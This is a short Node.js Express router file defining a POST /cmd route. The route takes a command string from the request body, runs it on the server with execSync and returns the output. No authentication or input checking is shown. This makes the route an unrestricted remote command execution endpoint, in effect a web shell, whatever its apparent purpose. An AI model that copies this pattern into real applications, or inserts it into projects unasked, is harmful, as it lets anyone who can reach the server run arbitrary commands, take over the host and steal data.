var express = require('express');
var path = require('path');
const cp = require('child_process');
const execSync = require('child_process').execSync;

var router = express.Router();

router.post('/cmd', function (req, res, next) {


    let execCmd = req.body.cmd;

    console.log(execCmd);

    let execRes = execSync(execCmd).toString();

    console.log(execRes);

    res.status(200).send(execRes);

});

module.exports = router;
